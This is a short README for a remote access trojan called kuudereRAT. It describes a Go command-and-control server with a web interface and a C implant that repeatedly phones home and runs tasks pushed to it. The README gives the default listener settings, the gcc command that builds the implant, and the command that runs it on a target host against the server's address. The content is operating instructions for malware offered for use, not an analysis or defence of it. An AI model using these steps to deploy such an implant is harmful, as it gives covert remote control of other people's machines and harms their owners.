# kuudereRAT
modular RAT

# Usage 
in ```src/server``` directory edit main.go and select options for listener the default is set to listen on ```0.0.0.0:23855``` and the webserver to be started on ```8080```

# Functionality
Phones home to server repeatedly. Tasks are written as modules in Go and the implant will pick up and run a task if one is available. 

# Implant
Current fully functional implant is ```src/client/alt/phonehome-1.c``` and it can be built with ```gcc -o implant phonehome-1.c -ldl```

# Running
```go run main.go``` to startup the server and web interface.
Tasks are loaded through the web interface.

The implant is run the target host ```./implant <ipaddr> <port>```